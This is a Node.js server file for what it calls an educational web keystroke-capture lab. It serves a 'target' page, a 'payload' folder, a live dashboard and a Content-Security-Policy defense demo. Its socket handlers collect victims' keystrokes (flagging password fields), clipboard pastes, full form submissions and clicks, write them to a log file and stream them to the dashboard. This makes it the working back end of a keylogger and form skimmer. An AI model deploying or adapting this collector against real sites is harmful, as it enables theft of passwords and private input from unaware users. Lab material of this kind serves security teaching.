const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

// ─── Configuration ───────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
const LOG_DIR = path.join(__dirname, 'logs');

// Ensure logs directory exists
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
}

// ─── Express Setup ───────────────────────────────────────────────
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: '*' }
});

app.use(cors());
app.use(express.json());


// Serve static files
app.use('/target', express.static(path.join(__dirname, 'public', 'target')));
app.use('/dashboard', express.static(path.join(__dirname, 'public', 'dashboard')));
app.use('/defense', express.static(path.join(__dirname, 'public', 'defense')));
app.use('/payload', express.static(path.join(__dirname, 'public', 'payload')));

// ─── In-Memory Session Store ─────────────────────────────────────
const sessions = new Map();

function getOrCreateSession(sessionId, metadata = {}) {
    if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
            id: sessionId,
            metadata: metadata,
            keystrokes: [],
            clipboardEvents: [],
            formSubmissions: [],
            clickEvents: [],
            createdAt: new Date().toISOString(),
            lastActivity: new Date().toISOString(),
            totalKeystrokes: 0
        });
    }
    const session = sessions.get(sessionId);
    session.lastActivity = new Date().toISOString();
    return session;
}

// ─── REST API Endpoints ──────────────────────────────────────────

// Home redirect
app.get('/', (req, res) => {
    res.redirect('/target');
});

// Target page (serve index.html from target folder)
app.get('/target', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'target', 'index.html'));
});

// Dashboard
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard', 'index.html'));
});

// API: Get all sessions
app.get('/api/sessions', (req, res) => {
    const sessionList = Array.from(sessions.values()).map(s => ({
        id: s.id,
        metadata: s.metadata,
        totalKeystrokes: s.totalKeystrokes,
        clipboardEvents: s.clipboardEvents.length,
        formSubmissions: s.formSubmissions.length,
        clickEvents: s.clickEvents.length,
        createdAt: s.createdAt,
        lastActivity: s.lastActivity
    }));
    res.json(sessionList);
});

// API: Get session detail
app.get('/api/sessions/:id', (req, res) => {
    const session = sessions.get(req.params.id);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json(session);
});

// API: Stats
app.get('/api/stats', (req, res) => {
    let totalKeys = 0;
    let totalClips = 0;
    let totalForms = 0;
    let totalClicks = 0;
    sessions.forEach(s => {
        totalKeys += s.totalKeystrokes;
        totalClips += s.clipboardEvents.length;
        totalForms += s.formSubmissions.length;
        totalClicks += s.clickEvents.length;
    });
    res.json({
        activeSessions: sessions.size,
        totalKeystrokes: totalKeys,
        totalClipboardEvents: totalClips,
        totalFormSubmissions: totalForms,
        totalClickEvents: totalClicks
    });
});

// ─── Defense Demo Routes ─────────────────────────────────────────

// Serve CSP demo with actual CSP headers
app.get('/defense/csp-demo.html', (req, res) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self'; " +
        "connect-src 'none'; " +
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
        "font-src https://fonts.gstatic.com;"
    );
    res.sendFile(path.join(__dirname, 'public', 'defense', 'csp-demo.html'));
});

// ─── Socket.IO Real-Time Communication ───────────────────────────

io.on('connection', (socket) => {
    console.log(`\n🔌 [Socket] New connection: ${socket.id}`);

    // Client identifies itself
    socket.on('register', (data) => {
        const session = getOrCreateSession(data.sessionId, data.metadata);
        socket.join(`session:${data.sessionId}`);
        socket.sessionId = data.sessionId;

        console.log(`📋 [Register] Session: ${data.sessionId}`);
        console.log(`   Browser: ${data.metadata?.browser || 'Unknown'}`);
        console.log(`   OS: ${data.metadata?.os || 'Unknown'}`);
        console.log(`   Screen: ${data.metadata?.screenResolution || 'Unknown'}`);

        // Notify dashboard
        io.to('dashboard').emit('session:new', {
            id: session.id,
            metadata: session.metadata,
            createdAt: session.createdAt
        });
    });

    // Keystroke batch
    socket.on('keystrokes', (data) => {
        const session = getOrCreateSession(data.sessionId);
        const keystrokes = data.keys || [];

        keystrokes.forEach(k => {
            session.keystrokes.push(k);
            session.totalKeystrokes++;
        });

        // Log to file
        const logLine = keystrokes.map(k =>
            `[${k.timestamp}] Session:${data.sessionId} | Field:${k.field || 'unknown'} | Key: ${k.key}`
        ).join('\n');
        fs.appendFileSync(path.join(LOG_DIR, 'keystrokes.log'), logLine + '\n');

        // Console output with color
        keystrokes.forEach(k => {
            const fieldColor = k.field === 'password' ? '\x1b[31m' : '\x1b[36m';
            console.log(`⌨️  ${fieldColor}[${k.field || '?'}]\x1b[0m ${k.key}`);
        });

        // Real-time to dashboard
        io.to('dashboard').emit('keystrokes:live', {
            sessionId: data.sessionId,
            keys: keystrokes,
            totalKeystrokes: session.totalKeystrokes
        });
    });

    // Clipboard event
    socket.on('clipboard', (data) => {
        const session = getOrCreateSession(data.sessionId);
        const event = {
            content: data.content,
            field: data.field,
            timestamp: data.timestamp
        };
        session.clipboardEvents.push(event);

        console.log(`📋 [Clipboard] Session:${data.sessionId} | Pasted: "${data.content}"`);
        fs.appendFileSync(path.join(LOG_DIR, 'keystrokes.log'),
            `[${data.timestamp}] Session:${data.sessionId} | CLIPBOARD PASTE: "${data.content}"\n`
        );

        io.to('dashboard').emit('clipboard:live', {
            sessionId: data.sessionId,
            ...event
        });
    });

    // Form submission capture
    socket.on('form-submit', (data) => {
        const session = getOrCreateSession(data.sessionId);
        const submission = {
            fields: data.fields,
            formId: data.formId,
            timestamp: data.timestamp
        };
        session.formSubmissions.push(submission);

        console.log(`\n🚨 \x1b[31m[FORM CAPTURED]\x1b[0m Session:${data.sessionId}`);
        Object.entries(data.fields).forEach(([key, val]) => {
            console.log(`   ${key}: ${val}`);
        });

        fs.appendFileSync(path.join(LOG_DIR, 'keystrokes.log'),
            `[${data.timestamp}] Session:${data.sessionId} | FORM SUBMIT: ${JSON.stringify(data.fields)}\n`
        );

        io.to('dashboard').emit('form:live', {
            sessionId: data.sessionId,
            ...submission
        });
    });

    // Click tracking
    socket.on('click', (data) => {
        const session = getOrCreateSession(data.sessionId);
        session.clickEvents.push({
            element: data.element,
            text: data.text,
            timestamp: data.timestamp
        });

        io.to('dashboard').emit('click:live', {
            sessionId: data.sessionId,
            element: data.element,
            text: data.text,
            timestamp: data.timestamp
        });
    });

    // Dashboard joins its own room
    socket.on('dashboard:join', () => {
        socket.join('dashboard');
        console.log('📊 [Dashboard] Monitor connected');
    });

    socket.on('disconnect', () => {
        console.log(`❌ [Socket] Disconnected: ${socket.id}`);
        if (socket.sessionId) {
            io.to('dashboard').emit('session:disconnected', {
                sessionId: socket.sessionId
            });
        }
    });
});

// ─── Start Server ────────────────────────────────────────────────
server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔬 Security Research: Web-Based Keystroke Capture          ║
║                                                              ║
║   ⚠️  FOR EDUCATIONAL PURPOSES ONLY                          ║
║                                                              ║
║   🌐 Target Page:   http://localhost:${PORT}/target            ║
║   📊 Dashboard:     http://localhost:${PORT}/dashboard         ║
║   🛡️  Defense Lab:   http://localhost:${PORT}/defense           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});
